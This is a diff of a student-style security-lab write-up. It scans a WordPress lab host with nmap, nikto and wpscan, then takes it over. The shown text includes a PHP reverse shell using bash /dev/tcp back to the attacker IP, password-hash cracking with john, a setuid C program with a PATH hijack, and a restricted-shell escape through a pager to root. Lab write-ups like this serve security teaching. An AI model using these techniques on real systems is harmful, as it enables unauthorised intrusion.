@@ -186,7 +186,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
 ```
-
+- Using `nikto` to identify vulnerabilities of running webserver
 
 ```bash
 $ nikto --url http://security-lab  
@@ -211,26 +211,11 @@ $ nikto --url http://security-lab
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-
-
-
-scanning usning wpscan
+- Found that website is running as `wordpress`
+- Scanning using `wpscan`
 
 ```bash
 $ sudo wpscan --url http://security-lab/blog/ 
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.14
-                               
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
 
 [+] URL: http://security-lab/blog/ [192.168.37.130]
 [+] Started: Sun Jul  4 16:04:33 2021
@@ -307,6 +292,12 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:16
 ```
 
+__summary of findings__
+1. Application running on the webserver is `wordpress version 5.3.2`
+2. Found login page at `/blog/wp-login.php`.
+3. Found wordpress theme `twentynineteen`.
+4. Found defaut username `admin` from the `blog` homepage
+
 
 ### Exercise 3: Pwn the machine
 
@@ -360,7 +351,7 @@ lab_prof:$6$2ovzYOy.y4KiJju8$tgrxr.dpK20mRYpmD.SvyFIJPwYwA/ogXnPGQjgB2nNM2gmQYne
 __Cracking the hash__
 - Tool used `John`
 
-- copy the hash into a file and load it with `john` with wordlist `rockyou.txt`
+- copy the hash into a file in `attacker machine` and load it with `john`, and specify the wordlist `rockyou.txt`
 ```bash
 $ john crack.teacher.db --wordlist=/home/kali/tryhackme/blue/rockyou.txt
 ```
@@ -389,6 +380,7 @@ __3. user ‘lab_teacher’.__
 
 - creating a `shell.php` file that contains our reverse shell and save it in the `/wordpress` directory.
 
+File: `shell.php`
 ```bash
 <?php
 exec("bash -i >& /dev/tcp/192.168.37.128/1234 0>&1");
@@ -505,6 +497,7 @@ $ which touch
 
 __C program that executes `/bin/bash` in privileged mode__
 
+file: `touch.c`
 ```c
 int main(){
         setuid(0);
@@ -556,6 +549,61 @@ PATH=.:$PATH /lab/monitor_students
 __Result__
 
 ![teacher_as_root_flag](images/teacher_as_root_flag.PNG)
+
+
+__3. Privilege escalation via __`ip_address`__ account.__
+
+- FOund the `ip_address` shell in `etc/passwd`
+```bash
+ip_address:x:1003:1004:,,,:/home/ip_address:/usr/bin/ipash
+```
+- On checking `/usr/bin/ipash`, found the following contents. (currently logged in `lab_prof`)
+```bash
+lab_prof@lab:~$ cat /usr/bin/ipash
+#!/bin/bash
+
+ifconfig > /tmp/ifconfig
+more /tmp/ifconfig
+
+read -n 1 -p "Make sure you copy the IP address. Afterwards press any key to exit." mainmenuinput
+```
+- checking the owner of `/usr/bin/ipash`
+```bash
+lab_prof@lab:~$ ls -la /usr/bin/ipash 
+-rwxr-xr-x 1 root root 156 Apr 27 18:20 /usr/bin/ipash
+```
+- Found that custom shell is running as root.
+
+- Now exit from the victim machine 
+- Make the terminal window size to `70 x 10` and connect via `attacker machine` to account `ip_address` via ssh.
+
+```bash
+$ ssh ip_address@192.168.37.130 password:ip_address
+```
+![more](images/more.PNG)
+
+- Now press `v` for to enter into `VISUAL` edit mode
+- press `ESC` and enter the following commands to exit the editor
+```bash
+:set shell=/bin/bash
+:shell
+``` 
+__Result (interactive shell)__
+![ip_address_shell](images/ip_address_shell.PNG) 
+- Running bash as sudo
+```bash
+$ sudo /usr/bin/bash
+```
+- Reading the flag
+```bash
+root@lab:/home/ip_address# cat /root/root.txt 
+{0nLy_w0RthY_57uD3Nt5_4r3_4Ble_t0_oBt41n_tH15_fL46} 
+```
+__Result__
+
+![ip_address_sudo](images/ip_address_sudo.PNG)
+
+
 
 
 
